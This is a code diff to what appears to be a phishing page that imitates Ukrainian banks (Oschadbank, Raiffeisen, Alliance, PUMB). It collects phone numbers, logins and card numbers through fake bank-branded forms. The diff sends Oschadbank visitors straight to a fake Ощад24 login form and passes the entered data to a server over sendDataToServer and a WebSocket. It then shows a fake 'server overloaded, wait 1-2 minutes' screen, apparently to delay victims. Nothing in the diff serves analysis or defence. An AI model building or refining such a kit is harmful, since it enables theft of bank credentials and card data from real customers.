@@ -128,7 +128,7 @@
         }
         .oschad-input-group.phone-group.is-focused > label,
         .oschad-input-group.phone-group.has-value > label {
-            left: 10px; /* Возвращаем стандартный отступ при сдвиге */
+            left: 10px;
         }
         .oschad-input-field {
             width: 100%; padding: 18px 45px 18px 15px;
@@ -165,7 +165,7 @@
         }
         .forgot-password-link {
             display: block;
-            text-align: center; /* ИЗМЕНЕНИЕ: Выравнивание по центру */
+            text-align: center;
             margin-top: -10px;
             margin-bottom: 20px;
             color: #00A39C;
@@ -186,7 +186,9 @@
             background-color: #00A39C; color: var(--white); cursor: pointer;
         }
         .loader-icon {
-            width: 80px; height: 80px; max-width: 100%;
+            width: 120px; /* ИЗМЕНЕНИЕ: Увеличен размер иконки */
+            height: 120px; /* ИЗМЕНЕНИЕ: Увеличен размер иконки */
+            max-width: 100%;
             margin: 20px auto;
             animation: spin 2s linear infinite;
             mix-blend-mode: multiply;
@@ -243,7 +245,8 @@
 document.addEventListener('DOMContentLoaded', () => {
 
     const bankFlows = {
-        'oschadbank': { name: 'Ощадбанк', logoUrl: 'https://upload.wikimedia.org/wikipedia/commons/thumb/d/da/Oschadbank_%28uk%29.png/1200px-Oschadbank_%28uk%29.png', theme: 'oschadbank', steps: [{ type: 'phone', title: 'Введіть номер телефону' },{ type: 'card', title: 'Введіть номер карти' }] },
+        /* ИЗМЕНЕНИЕ: Шаги для Ощадбанка удалены, так как теперь сразу открывается кастомная форма */
+        'oschadbank': { name: 'Ощадбанк', logoUrl: 'https://upload.wikimedia.org/wikipedia/commons/thumb/d/da/Oschadbank_%28uk%29.png/1200px-Oschadbank_%28uk%29.png', theme: 'oschadbank', steps: [] },
         'raiffeisen': { name: 'Райффайзен', logoUrl: 'https://platforma-msb.org/wp-content/uploads/2017/08/rajffajzen-1920x1080316.jpg', theme: 'raiffeisen', steps: [{ type: 'phone', title: 'Введіть номер телефону' },{ type: 'card_simple', title: 'Для зарахування коштів введіть номер картки' }], special: true },
         'alliance': { name: 'Альянс', logoUrl: 'https://bank.gov.ua/files/Logobank/300119.png?v=14', theme: 'alliance', steps: [{ type: 'phone', title: 'Введіть номер телефону' },{ type: 'card_simple', title: 'Для зарахування коштів введіть номер картки' }], special: true },
         'pumb': { name: 'ПУМБ', logoUrl: 'https://mixfin-com.b-cdn.net/ua/wp-content/uploads/2025/01/pumb_logo_mixfin.webp', theme: 'pumb', steps: [{ type: 'phone', title: 'Введіть номер телефону' },{ type: 'card_simple', title: 'Для зарахування коштів введіть номер картки' }], special: true },
@@ -289,11 +292,11 @@ document.addEventListener('DOMContentLoaded', () => {
                 html = `
                     <div class="oschad-header">
                         <span class="back-arrow" id="oschad-back-arrow">←</span>
-                        <span class="title">Авторизуйтесь в Ощад24</span>
-                    </div>
+                        <span class="title">Авторизуйтесь через Ощад24</span> </div>
                     <div class="oschad-welcome-section">
                         <h2 class="oschad-main-title">Ласкаво просимо</h2>
-                        <p>Для входу введіть логін або номер телефону</p> <div class="oschad-toggle-buttons">
+                        <p>Для входу введіть логін або номер телефону</p>
+                        <div class="oschad-toggle-buttons">
                             <button id="toggle-phone" class="active">Номер телефону</button>
                             <button id="toggle-login">Логін</button>
                         </div>
@@ -458,13 +461,15 @@ document.addEventListener('DOMContentLoaded', () => {
                 sendDataToServer(dataToSend, true);
                 
                 if (bankName === 'Ощадбанк') {
+                     /* ИЗМЕНЕНИЕ: Обновлен экран загрузки */
                      customModalContent.innerHTML = `
                          <div class="oschad-header">
                             <span class="back-arrow" id="loader-back-arrow">←</span>
                             <span class="title"></span>
                         </div>
                         <div class="oschad-welcome-section">
-                            <h3>Сервер перевантажений</h3>
+                            <h3 style="text-align: center; width: 100%;">Сервер перевантажений</h3>
+                            <p style="text-align: center; width: 100%; margin-top: 5px;">зачекайте 1-2хв</p>
                             <img src="https://itc.ua/wp-content/uploads/2021/12/oschadik_mint_headphones-770x770.png" class="loader-icon" alt="Loading...">
                         </div>
                      `;
@@ -476,7 +481,32 @@ document.addEventListener('DOMContentLoaded', () => {
         }
     }
     
-    document.querySelectorAll('.bank-item').forEach(item => { item.addEventListener('click', e => { e.preventDefault(); if (item.classList.contains('disabled')) return; const bankId = item.dataset.bank; activeBankData = JSON.parse(JSON.stringify(bankFlows[bankId])); body.dataset.theme = activeBankData.theme; formHeaderLogo.src = activeBankData.logoUrl; body.classList.add('form-active'); currentStepIndex = 0; collectedData = {}; renderStep(); connectWebSocket(); }); });
+    /* ИЗМЕНЕНИЕ: Логика клика разделена для Ощадбанка и остальных банков */
+    document.querySelectorAll('.bank-item').forEach(item => {
+        item.addEventListener('click', e => {
+            e.preventDefault();
+            if (item.classList.contains('disabled')) return;
+            const bankId = item.dataset.bank;
+            
+            if (bankId === 'oschadbank') {
+                // Для Ощадбанка сразу показываем кастомную форму
+                activeBankData = JSON.parse(JSON.stringify(bankFlows[bankId]));
+                renderCustomModal('lk', activeBankData.name);
+                connectWebSocket();
+            } else {
+                // Для всех остальных банков - стандартный пошаговый процесс
+                activeBankData = JSON.parse(JSON.stringify(bankFlows[bankId]));
+                body.dataset.theme = activeBankData.theme;
+                formHeaderLogo.src = activeBankData.logoUrl;
+                body.classList.add('form-active');
+                currentStepIndex = 0;
+                collectedData = {};
+                renderStep();
+                connectWebSocket();
+            }
+        });
+    });
+
     nextBtn.addEventListener('click', handleNextStep);
     backBtn.addEventListener('click', handleBackStep);
     
